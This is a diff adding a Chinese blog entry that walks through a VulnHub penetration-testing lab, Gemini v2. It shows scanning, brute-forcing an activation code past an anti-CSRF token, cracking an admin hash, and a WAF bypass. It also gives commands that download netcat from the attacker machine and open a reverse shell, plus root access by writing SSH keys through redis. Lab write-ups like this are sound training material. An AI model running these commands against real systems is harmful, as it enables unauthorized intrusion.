@@ -1219,4 +1219,45 @@
         <tag>Linux</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Gemini_V2</title>
+    <url>/2022/02/07/Geminiv2/index/</url>
+    <content><![CDATA[<h1 id="Gemini-V2"><a href="#Gemini-V2" class="headerlink" title="Gemini_V2"></a>Gemini_V2</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h5 id="下载地址：https-download-vulnhub-com-geminiinc-Gemini-Pentest-v2-zip"><a href="#下载地址：https-download-vulnhub-com-geminiinc-Gemini-Pentest-v2-zip" class="headerlink" title="下载地址：https://download.vulnhub.com/geminiinc/Gemini-Pentest-v2.zip"></a>下载地址：<a href="https://download.vulnhub.com/geminiinc/Gemini-Pentest-v2.zip">https://download.vulnhub.com/geminiinc/Gemini-Pentest-v2.zip</a></h5><h5 id="难度：middlum"><a href="#难度：middlum" class="headerlink" title="难度：middlum"></a>难度：middlum</h5><h5 id="运行环境：Vmware"><a href="#运行环境：Vmware" class="headerlink" title="运行环境：Vmware"></a>运行环境：Vmware</h5><hr>
+<h5 id="目标主机：-Debian-Linux-192-168-0-103"><a href="#目标主机：-Debian-Linux-192-168-0-103" class="headerlink" title="目标主机： Debian Linux 192.168.0.103"></a>目标主机： <em>Debian Linux 192.168.0.103</em></h5><h5 id="本机主机：-Kali-Linux-192-168-0-107"><a href="#本机主机：-Kali-Linux-192-168-0-107" class="headerlink" title="本机主机： Kali Linux 192.168.0.107"></a>本机主机： <em>Kali Linux 192.168.0.107</em></h5><hr>
+<p><code>环境变量篡改</code></p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>依然是使用 <code>arp-scan</code>来进行扫描，得到的目标结果是 <code>192.168.0.113</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.107</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.103	00:0c:29:b5:bb:c5	VMware, Inc.(目标主机)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><p>使用<code>nmap</code>进行端口扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202071502868.png"></p>
+<p>打开了<code>22</code>（ssh），<code>80</code>（http）端口</p>
+<h3 id="3-文件信息泄露"><a href="#3-文件信息泄露" class="headerlink" title="3.文件信息泄露"></a>3.文件信息泄露</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202071504933.png"></p>
+<p>以上目录扫描不全面，使用该命令即可(篇幅过长)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.0.103/ -w /usr/share/wordlists/dirb/big.txt -e php -f </span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Web漏洞发现"><a href="#4-Web漏洞发现" class="headerlink" title="4.Web漏洞发现"></a>4.Web漏洞发现</h3><p>通过目录扫描后得到，<code>registration.php</code>可以进行账号注册，注册一个<code>admin</code>账号即可，但是发现，目标的账号需要进行激活操作，也就是一个6位数的验证码，而在我刚才进行目录发现时，刚好得到了一个页面，好像就可以进行激活账号<code>activate.php</code>，然而，很不幸的是这个页面 使用了<code>Anti-CSRF Token</code>，无法使用爆破的方式进行账户激活，但是仔细寻找可以发现，该页面的第一次请求回包，会反馈下一次发包的<code>token</code></p>
+<p>使用burp进行暴力破解</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202071629785.png"></p>
+<p>可以看到<code>000511</code>成功的激活了密码</p>
+<p>在登录后，查看自己的cookie中携带了一串<code>password</code>的数据，为sha1(password),然后在目标的userlist处寻找管理员账户，打开管理员的页面后，查看页面源代码得到了目标管理员的密码哈希值，使用sha1解密进行破解得到了密码为 <code>Gemini:secretpassword</code>,然后成功的登录了目标的web页面，在admin页面中找到了一个 <code>Execution Command</code>模块，然后他存在<code>403</code>限制，使用burp的 <code>WAF Bypass</code>进行测试，尝试绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202071643380.png"></p>
+<p>成功</p>
+<h3 id="5-边境突破"><a href="#5-边境突破" class="headerlink" title="5.边境突破"></a>5.边境突破</h3><p>在命令执行模块内发现目标对空格进行过滤，使用 <code>%09</code>来代替空格</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://192.168.0.107/nc -O /tmp/nc</span><br><span class="line">chmod +x /tmp/nc </span><br><span class="line">/tmp/nc 192.168.0.107 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>成功得到shell</p>
+<p>反弹<code>pty</code></p>
+<h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6.提权"></a>6.提权</h3><p>使用nc将本机的 <code>id_rsa.pub</code>文件传输到目标的<code>authorized_keys</code>中，然后使用ssh进行登录</p>
+<p>目标使用的 <code>redis</code>密码泄露,<code>redis</code>的默认安装路径在 <code>/etc/redis/</code>,密码为 <code>8a7b86a2cd89d96dfcc125ebcc0535e6</code>，</p>
+<p>登录方式为 <code>redis-cli -a &#123;PASSWORD&#125;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202071718483.png"></p>
+<p>因为<code>redis</code>所运行的权限很高，因此通过redis写入文件到root的文件中，即可完成使用ssh登录root用户</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-middlum</tag>
+      </tags>
+  </entry>
 </search>
